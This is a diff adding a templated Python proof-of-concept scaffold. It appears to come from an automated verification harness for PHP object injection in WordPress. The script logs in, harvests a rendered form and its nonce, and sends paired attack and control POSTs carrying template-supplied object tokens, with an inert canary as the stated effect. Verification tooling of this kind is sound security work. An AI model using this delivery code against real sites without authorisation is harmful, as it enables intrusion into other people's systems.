@@ -1,0 +1,643 @@
+from copy import deepcopy
+from decimal import Decimal, InvalidOperation
+from html.parser import HTMLParser
+from urllib.parse import urlsplit
+
+import requests
+
+from poc_result import emit_result
+from wp_login import wp_login
+
+
+TARGET = {{ target_url | tojson }}
+METHOD = {{ request_method | default("") | tojson }}
+ROUTE = {{ request_route | default("") | tojson }}
+DISPATCH = {{ request_dispatch | default({}) | tojson }}
+OBJECT_FIELD = {{ php_object_field | default("") | tojson }}
+OBJECT_LOCATION = {{ php_object_location | default("") | tojson }}
+ATTACK_TOKEN = {{ php_object_attack_token | default("") | tojson }}
+CONTROL_TOKEN = {{ php_object_control_token | default("") | tojson }}
+USERNAME = {{ test_username | default("") | tojson }}
+PASSWORD = {{ test_password | default("") | tojson }}
+ATTACKER_ROLE = {{ attacker_role | default("unknown") | tojson }}
+
+# The author must make this decision from the source and authoritative setup
+# results. Leave it as None and the scaffold fails before making a request.
+FORM_BOOTSTRAP_REQUIRED = None
+
+# When source proves that no rendered form is required, set this to the complete
+# ordered list of source-required (name, value) pairs. Use [] explicitly only
+# when source proves dispatch and the object field are the entire form envelope.
+SOURCE_COMPLETE_FORM_FIELDS = None
+
+# For a rendered-form workflow, replace these values only from authoritative
+# setup output and source/rendered-form evidence. FORM_IDENTITY is a stable
+# hidden field/value pair (or pairs) identifying the setup-created form.
+PUBLIC_FORM_URL = ""
+FORM_IDENTITY = {}
+COHERENT_FORM_FIELDS = None
+REUSABLE_CSRF_FIELDS = None
+# List source-required semantic controls here, excluding dispatch fields and the
+# object field: those source-bound values are deliberately applied afterward.
+REQUIRED_FORM_FIELDS = None
+FORM_FIELD_VALUES = None
+
+
+class _RenderedFormParser(HTMLParser):
+    """Collect successful, non-submit controls while preserving pair order."""
+
+    def __init__(self):
+        super().__init__(convert_charrefs=True)
+        self.forms = []
+        self._form = None
+        self._textarea = None
+        self._select = None
+        self._option = None
+
+    @staticmethod
+    def _attrs(raw_attrs):
+        attrs = {}
+        for name, value in raw_attrs:
+            if name in attrs:
+                raise RuntimeError("rendered form contains a duplicate attribute")
+            attrs[name] = "" if value is None else value
+        return attrs
+
+    def _add_control_name(self, attrs):
+        if self._form is None or "disabled" in attrs:
+            return ""
+        name = attrs.get("name", "")
+        if not name:
+            return ""
+        self._form["names"].add(name)
+        if "required" in attrs:
+            self._form["required"].add(name)
+        return name
+
+    def handle_starttag(self, tag, raw_attrs):
+        attrs = self._attrs(raw_attrs)
+        tag = tag.lower()
+        if tag == "form":
+            if self._form is not None:
+                raise RuntimeError("rendered forms must not be nested")
+            self._form = {
+                "pairs": [],
+                "names": set(),
+                "required": set(),
+                "constraints": {},
+                "unsupported": set(),
+            }
+            return
+        if self._form is None:
+            return
+        if tag == "fieldset" and "disabled" in attrs:
+            # The first-legend exception needs a DOM implementation. Failing the
+            # candidate closed is safer than submitting browser-ineligible fields.
+            self._form["unsupported"].add("disabled fieldset")
+            return
+        if tag == "optgroup" and "disabled" in attrs:
+            self._form["unsupported"].add("disabled optgroup")
+            return
+        if tag == "input":
+            input_type = attrs.get("type", "text").lower()
+            if input_type in {
+                "button",
+                "image",
+                "reset",
+                "submit",
+            }:
+                return
+            name = self._add_control_name(attrs)
+            if not name:
+                return
+            if input_type == "file":
+                if "required" in attrs:
+                    self._form["unsupported"].add("required file input")
+                return
+            self._record_constraints(name, input_type, attrs)
+            if input_type in {"checkbox", "radio"} and "checked" not in attrs:
+                return
+            default = "on" if input_type in {"checkbox", "radio"} else ""
+            self._form["pairs"].append((name, attrs.get("value", default)))
+            return
+        if tag == "textarea":
+            name = self._add_control_name(attrs)
+            if name:
+                self._record_constraints(name, "textarea", attrs)
+            self._textarea = {"name": name, "chunks": []} if name else None
+            return
+        if tag == "select":
+            name = self._add_control_name(attrs)
+            if name:
+                self._record_constraints(name, "select", attrs)
+            self._select = (
+                {
+                    "name": name,
+                    "multiple": "multiple" in attrs,
+                    "options": [],
+                }
+                if name
+                else None
+            )
+            return
+        if tag == "option" and self._select is not None:
+            self._finish_option()
+            self._option = {
+                "value": attrs.get("value"),
+                "selected": "selected" in attrs,
+                "disabled": "disabled" in attrs,
+                "chunks": [],
+            }
+
+    def _record_constraints(self, name, kind, attrs):
+        constraint = {
+            "kind": kind,
+            "minlength": attrs.get("minlength"),
+            "maxlength": attrs.get("maxlength"),
+            "min": attrs.get("min"),
+            "max": attrs.get("max"),
+            "multiple": "multiple" in attrs,
+        }
+        if "pattern" in attrs:
+            # HTML pattern syntax follows JavaScript's Unicode-regexp rules and
+            # cannot safely be approximated by Python's regular-expression engine.
+            self._form["unsupported"].add("pattern-constrained input")
+        if kind == "number" and attrs.get("step") not in {None, "", "any"}:
+            self._form["unsupported"].add("step-constrained number input")
+        constraints = self._form["constraints"].setdefault(name, [])
+        if constraint not in constraints:
+            constraints.append(constraint)
+
+    def handle_data(self, data):
+        if self._textarea is not None:
+            self._textarea["chunks"].append(data)
+        if self._option is not None:
+            self._option["chunks"].append(data)
+
+    def _finish_option(self):
+        if self._select is None or self._option is None:
+            return
+        value = self._option["value"]
+        if value is None:
+            value = "".join(self._option["chunks"]).strip()
+        self._select["options"].append(
+            (value, self._option["selected"], self._option["disabled"])
+        )
+        self._option = None
+
+    def _finish_select(self):
+        if self._form is None or self._select is None:
+            self._select = None
+            self._option = None
+            return
+        self._finish_option()
+        usable = [item for item in self._select["options"] if not item[2]]
+        selected = [item for item in usable if item[1]]
+        if not selected and usable and not self._select["multiple"]:
+            selected = usable[:1]
+        for value, _selected, _disabled in selected:
+            self._form["pairs"].append((self._select["name"], value))
+        self._select = None
+
+    def handle_endtag(self, tag):
+        tag = tag.lower()
+        if tag == "textarea" and self._form is not None and self._textarea is not None:
+            self._form["pairs"].append(
+                (self._textarea["name"], "".join(self._textarea["chunks"]))
+            )
+            self._textarea = None
+        elif tag == "option":
+            self._finish_option()
+        elif tag == "select":
+            self._finish_select()
+        elif tag == "form" and self._form is not None:
+            self._finish_select()
+            self.forms.append(self._form)
+            self._form = None
+            self._textarea = None
+
+
+def _field_values(pairs, name):
+    return [value for field, value in pairs if field == name]
+
+
+def _select_source_grounded_form(html, identity, coherent_fields):
+    parser = _RenderedFormParser()
+    parser.feed(html)
+    parser.close()
+    matches = []
+    for form in parser.forms:
+        identity_matches = all(
+            _field_values(form["pairs"], name) == [expected]
+            for name, expected in identity.items()
+        )
+        if identity_matches and set(coherent_fields).issubset(form["names"]):
+            matches.append(form)
+    if len(matches) != 1:
+        raise RuntimeError("expected exactly one coherent source-grounded form")
+    if matches[0]["unsupported"]:
+        raise RuntimeError(
+            "source-grounded form contains unsupported browser-only constraints"
+        )
+    return matches[0]
+
+
+def _replacement_values(value):
+    values = [value] if isinstance(value, str) else value
+    if not isinstance(values, (list, tuple)) or not values:
+        raise RuntimeError("form field replacement must contain string values")
+    if any(not isinstance(item, str) for item in values):
+        raise RuntimeError("form field replacement must contain string values")
+    return list(values)
+
+
+def _replace_field(pairs, name, value):
+    values = _replacement_values(value)
+    return [(field, item) for field, item in pairs if field != name] + [
+        (name, item) for item in values
+    ]
+
+
+def _bounded_integer_attribute(raw, label):
+    if raw is None:
+        return None
+    if not raw.isascii() or not raw.isdigit():
+        raise RuntimeError(f"rendered form has an invalid {label} constraint")
+    value = int(raw)
+    if value > 1000000:
+        raise RuntimeError(f"rendered form has an unreasonable {label} constraint")
+    return value
+
+
+def _decimal_attribute(raw, label):
+    if raw is None:
+        return None
+    try:
+        value = Decimal(raw)
+    except InvalidOperation as exc:
+        raise RuntimeError(
+            f"rendered form has an invalid {label} constraint"
+        ) from exc
+    if not value.is_finite():
+        raise RuntimeError(f"rendered form has an invalid {label} constraint")
+    return value
+
+
+def _valid_email(value):
+    if value.count("@") != 1 or any(character.isspace() for character in value):
+        return False
+    local, domain = value.split("@", 1)
+    return bool(local and domain and not domain.startswith(".") and not domain.endswith("."))
+
+
+def _validate_control_values(name, values, constraint):
+    minimum_length = _bounded_integer_attribute(
+        constraint["minlength"], "minlength"
+    )
+    maximum_length = _bounded_integer_attribute(
+        constraint["maxlength"], "maxlength"
+    )
+    if (
+        minimum_length is not None
+        and maximum_length is not None
+        and minimum_length > maximum_length
+    ):
+        raise RuntimeError("rendered form has contradictory length constraints")
+    for value in values:
+        if minimum_length is not None and len(value) < minimum_length:
+            raise RuntimeError(f"form field {name!r} violates minlength")
+        if maximum_length is not None and len(value) > maximum_length:
+            raise RuntimeError(f"form field {name!r} violates maxlength")
+
+    kind = constraint["kind"]
+    if kind == "email":
+        candidates = []
+        for value in values:
+            if constraint["multiple"]:
+                candidates.extend(item.strip() for item in value.split(","))
+            else:
+                candidates.append(value)
+        if any(value and not _valid_email(value) for value in candidates):
+            raise RuntimeError(f"form field {name!r} is not a valid email value")
+    elif kind == "number":
+        minimum = _decimal_attribute(constraint["min"], "min")
+        maximum = _decimal_attribute(constraint["max"], "max")
+        if minimum is not None and maximum is not None and minimum > maximum:
+            raise RuntimeError("rendered form has contradictory numeric constraints")
+        for raw in values:
+            if not raw:
+                continue
+            try:
+                value = Decimal(raw)
+            except InvalidOperation as exc:
+                raise RuntimeError(
+                    f"form field {name!r} is not a valid number"
+                ) from exc
+            if not value.is_finite():
+                raise RuntimeError(f"form field {name!r} is not a valid number")
+            if minimum is not None and value < minimum:
+                raise RuntimeError(f"form field {name!r} is below its minimum")
+            if maximum is not None and value > maximum:
+                raise RuntimeError(f"form field {name!r} is above its maximum")
+
+
+def _complete_rendered_form(
+    html,
+    identity,
+    coherent_fields,
+    csrf_fields,
+    source_required_fields,
+    field_values,
+    late_bound_fields,
+):
+    form = _select_source_grounded_form(html, identity, coherent_fields)
+    pairs = list(form["pairs"])
+    for name, value in field_values.items():
+        if name not in form["names"]:
+            raise RuntimeError("configured form value has no rendered control")
+        pairs = _replace_field(pairs, name, value)
+    required = (
+        set(source_required_fields) | set(form["required"])
+    ) - set(late_bound_fields)
+    for name in required:
+        if not any(value.strip() for value in _field_values(pairs, name)):
+            raise RuntimeError("required rendered form control lacks a semantic value")
+    for name, constraints in form["constraints"].items():
+        if name in late_bound_fields:
+            continue
+        values = _field_values(pairs, name)
+        for constraint in constraints:
+            _validate_control_values(name, values, constraint)
+    for name in csrf_fields:
+        values = _field_values(pairs, name)
+        if len(values) != 1 or not values[0].strip():
+            raise RuntimeError("reusable form nonce is missing or ambiguous")
+    return pairs
+
+
+def _late_bound_form_fields():
+    fields = {OBJECT_FIELD}
+    for typed_name in DISPATCH:
+        location, separator, field = typed_name.partition(":")
+        if not separator or not field or location not in {"query", "form"}:
+            raise RuntimeError("trusted PHP object dispatch is malformed")
+        if location == "form":
+            fields.add(field)
+    return fields
+
+
+def _source_complete_form_fields():
+    if not isinstance(SOURCE_COMPLETE_FORM_FIELDS, (list, tuple)):
+        raise RuntimeError(
+            "direct form mode requires an explicit source-complete field list"
+        )
+    pairs = []
+    for pair in SOURCE_COMPLETE_FORM_FIELDS:
+        if (
+            not isinstance(pair, (list, tuple))
+            or len(pair) != 2
+            or not isinstance(pair[0], str)
+            or not pair[0]
+            or not isinstance(pair[1], str)
+        ):
+            raise RuntimeError("source-complete form fields must be string pairs")
+        pairs.append((pair[0], pair[1]))
+    return pairs
+
+
+def _clone_bootstrapped_session(source, *, include_cookies=True):
+    """Fork request state so attack Set-Cookie cannot affect the control arm."""
+    clone = requests.Session()
+    clone.headers = source.headers.copy()
+    if include_cookies:
+        clone.cookies = deepcopy(source.cookies)
+    else:
+        clone.headers.pop("Cookie", None)
+    clone.auth = deepcopy(source.auth)
+    clone.proxies = deepcopy(source.proxies)
+    clone.hooks = deepcopy(source.hooks)
+    clone.params = deepcopy(source.params)
+    clone.verify = source.verify
+    clone.cert = deepcopy(source.cert)
+    clone.max_redirects = source.max_redirects
+    clone.trust_env = source.trust_env
+    return clone
+
+
+def _bootstrap_form(session):
+    if FORM_BOOTSTRAP_REQUIRED is None:
+        raise RuntimeError(
+            "PoC author must explicitly decide whether rendered-form bootstrap is required"
+        )
+    if FORM_BOOTSTRAP_REQUIRED is False:
+        return _source_complete_form_fields()
+    if FORM_BOOTSTRAP_REQUIRED is not True:
+        raise RuntimeError("FORM_BOOTSTRAP_REQUIRED must be exactly true or false")
+    field_name_groups = (
+        COHERENT_FORM_FIELDS,
+        REUSABLE_CSRF_FIELDS,
+        REQUIRED_FORM_FIELDS,
+    )
+    late_bound_fields = _late_bound_form_fields()
+    if (
+        not isinstance(PUBLIC_FORM_URL, str)
+        or not PUBLIC_FORM_URL
+        or not isinstance(FORM_IDENTITY, dict)
+        or not FORM_IDENTITY
+        or not isinstance(COHERENT_FORM_FIELDS, (list, tuple))
+        or not COHERENT_FORM_FIELDS
+        or not isinstance(REUSABLE_CSRF_FIELDS, (list, tuple))
+        or not isinstance(REQUIRED_FORM_FIELDS, (list, tuple))
+        or not isinstance(FORM_FIELD_VALUES, dict)
+        or SOURCE_COMPLETE_FORM_FIELDS is not None
+        or any(
+            not isinstance(name, str)
+            or not name
+            or not isinstance(value, str)
+            or not value
+            for name, value in FORM_IDENTITY.items()
+        )
+        or any(
+            any(not isinstance(name, str) or not name for name in names)
+            or len(set(names)) != len(names)
+            for names in field_name_groups
+        )
+        or any(
+            not isinstance(name, str)
+            or not name
+            or (
+                not isinstance(value, str)
+                and (
+                    not isinstance(value, (list, tuple))
+                    or not value
+                    or any(not isinstance(item, str) for item in value)
+                )
+            )
+            for name, value in FORM_FIELD_VALUES.items()
+        )
+        or set(FORM_FIELD_VALUES).intersection(
+            set(FORM_IDENTITY)
+            | set(REUSABLE_CSRF_FIELDS)
+            | late_bound_fields
+        )
+        or set(REQUIRED_FORM_FIELDS).intersection(late_bound_fields)
+        or OBJECT_FIELD in set(FORM_IDENTITY) | set(REUSABLE_CSRF_FIELDS)
+    ):
+        raise RuntimeError("rendered-form bootstrap configuration is incomplete")
+    target = urlsplit(TARGET)
+    public_form = urlsplit(PUBLIC_FORM_URL)
+    if (
+        public_form.scheme != target.scheme
+        or public_form.netloc != target.netloc
+        or public_form.username is not None
+        or public_form.password is not None
+        or public_form.fragment
+    ):
+        raise RuntimeError("authoritative public form URL must use the target origin")
+    response = session.get(
+        PUBLIC_FORM_URL,
+        timeout=30,
+        allow_redirects=False,
+    )
+    if response.status_code != 200:
+        raise RuntimeError("authoritative public form GET did not return HTTP 200")
+    return _complete_rendered_form(
+        response.text,
+        FORM_IDENTITY,
+        COHERENT_FORM_FIELDS,
+        REUSABLE_CSRF_FIELDS,
+        REQUIRED_FORM_FIELDS,
+        FORM_FIELD_VALUES,
+        late_bound_fields,
+    )
+
+
+if (
+    METHOD != "POST"
+    or not ROUTE.startswith("/")
+    or OBJECT_LOCATION != "form"
+    or not OBJECT_FIELD
+    or not ATTACK_TOKEN
+    or not CONTROL_TOKEN
+    or ATTACK_TOKEN == CONTROL_TOKEN
+):
+    raise RuntimeError("trusted PHP object transport is incomplete")
+
+bootstrap_session = requests.Session()
+unauthenticated_actor = ATTACKER_ROLE.lower() in {
+    "unauthenticated",
+    "anonymous",
+    "guest",
+}
+if unauthenticated_actor:
+    attacker_user_id = "anonymous"
+else:
+    login = wp_login(bootstrap_session, TARGET, USERNAME, PASSWORD)
+    if not login.success or not isinstance(login.identity.user_id, int):
+        raise RuntimeError(f"attacker login failed: {login.reason}")
+    if login.identity.user_id <= 0:
+        raise RuntimeError("attacker login did not yield a positive WordPress user ID")
+    attacker_user_id = login.identity.user_id
+
+# Build the complete, source-valid baseline before adding either opaque token.
+query = []
+form = _bootstrap_form(bootstrap_session)
+form_dispatch_fields = set()
+protected_form_fields = (
+    set(FORM_IDENTITY) | set(REUSABLE_CSRF_FIELDS)
+    if FORM_BOOTSTRAP_REQUIRED is True
+    else set()
+)
+for typed_name, exact_value in DISPATCH.items():
+    location, separator, field = typed_name.partition(":")
+    if not separator or not field or location not in {"query", "form"}:
+        raise RuntimeError("trusted PHP object dispatch is malformed")
+    if location == "query":
+        if any(name == field for name, _value in query):
+            raise RuntimeError("trusted PHP object dispatch contains a duplicate field")
+        query.append((field, exact_value))
+    else:
+        if field in form_dispatch_fields:
+            raise RuntimeError("trusted PHP object dispatch contains a duplicate field")
+        form_dispatch_fields.add(field)
+        if field in protected_form_fields:
+            if _field_values(form, field) != [exact_value]:
+                raise RuntimeError(
+                    "trusted dispatch conflicts with preserved form identity or nonce"
+                )
+        else:
+            form = _replace_field(form, field, exact_value)
+if OBJECT_FIELD in form_dispatch_fields:
+    raise RuntimeError("trusted PHP object destination collides with dispatch")
+if OBJECT_FIELD in protected_form_fields:
+    raise RuntimeError("object field collides with preserved form identity or nonce")
+
+# Before this point, use only the standard wp_login flow and the single bounded
+# public form/nonce GET above. Once cloned, attack and control are the next two
+# target requests. Authenticated sessions retain identical bootstrap cookies;
+# unauthenticated arms deliberately start with empty cookie jars. In both modes,
+# response cookies from attack cannot alter the control request envelope.
+attack_form = _replace_field(form, OBJECT_FIELD, ATTACK_TOKEN)
+control_form = _replace_field(form, OBJECT_FIELD, CONTROL_TOKEN)
+attack_session = _clone_bootstrapped_session(
+    bootstrap_session,
+    include_cookies=not unauthenticated_actor,
+)
+control_session = _clone_bootstrapped_session(
+    bootstrap_session,
+    include_cookies=not unauthenticated_actor,
+)
+endpoint = f"{TARGET}{ROUTE}"
+
+attack_response = attack_session.request(
+    METHOD,
+    endpoint,
+    params=query,
+    data=attack_form,
+    timeout=30,
+    allow_redirects=False,
+)
+control_response = control_session.request(
+    METHOD,
+    endpoint,
+    params=query,
+    data=control_form,
+    timeout=30,
+    allow_redirects=False,
+)
+
+fingerprint = {
+    "method": METHOD,
+    "route": ROUTE,
+    "object_field": OBJECT_FIELD,
+    "object_location": OBJECT_LOCATION,
+    "dispatch": DISPATCH,
+}
+emit_result(
+    # These declarations are not the proof. The parent independently requires
+    # an attack-only HMAC receipt bound to the rewritten wire requests.
+    verdict="vulnerable",
+    oracle="object_instantiation",
+    attacker_role=ATTACKER_ROLE,
+    request={"method": METHOD, "url": endpoint},
+    attack={
+        "observed": True,
+        "instantiated": True,
+        "effect": "verifier_inert_canary_wakeup",
+        "attacker_user_id": attacker_user_id,
+        "identity_verified": True,
+        "request_fingerprint": fingerprint,
+    },
+    control={
+        "observed": False,
+        "instantiated": False,
+        "effect": "verifier_inert_canary_wakeup",
+        "attacker_user_id": attacker_user_id,
+        "identity_verified": True,
+        "request_fingerprint": fingerprint,
+    },
+    confidentiality="none",
+    integrity="low",
+    availability="none",
+    impact={{ php_object_impact_description | default("") | tojson }},
+)
